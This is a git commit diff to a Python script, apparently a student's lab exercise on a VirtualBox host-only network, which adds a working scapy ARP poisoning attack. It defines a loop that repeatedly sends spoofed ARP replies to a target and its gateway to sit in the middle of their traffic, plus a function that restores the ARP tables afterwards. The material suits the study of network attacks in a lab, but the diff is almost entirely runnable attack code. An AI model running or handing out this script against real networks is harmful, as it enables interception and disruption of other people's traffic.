c5f847fcf1faca2d3ac13da3246e8bb1d2948b43
Valentijn <v.h.l.v.d.berg@student.tue.nl>
2021-05-12 17:08:23 +0200

    arp poison

--- main.py
+++ main.py
@@ -1,12 +1,31 @@
-from scapy.layers.l2 import Ether, ARP
-from scapy.sendrecv import sendp
+from scapy.layers.l2 import Ether, ARP, getmacbyip
+from scapy import route
+from scapy.sendrecv import sendp, send
+import time
 
-print("Hello world")
-
-macM3 = "08:00:27:af:ee:33"
+#macM3 = "08:00:27:af:ee:33"
 ipM3 = "192.168.56.103"
+print(getmacbyip(ipM3))
 
-macM1 = "08:00:27:d5:68:72"
+
+def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+
+
+def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
+    print("[*] Started ARP poison attack [CTRL-C to stop]")
+    try:
+        while True:
+            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("[*] Stopped ARP poison attack. Restoring network")
+        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+
+
+"""macM1 = "08:00:27:d5:68:72"
 ipM1 = "192.168.56.101"
 
 macM2 = "08:00:27:d0:ed:b3"
@@ -26,4 +45,4 @@ arpM2[ARP].psrc = ipM1
 arpM2[ARP].hwdst = macM2
 arpM2[ARP].pdst = ipM2
 
-sendp(arpM1 / arpM2, iface="enp0s3", loop=1, inter=1)
+sendp(arpM1 / arpM2, iface="enp0s3", loop=1, inter=1)"""
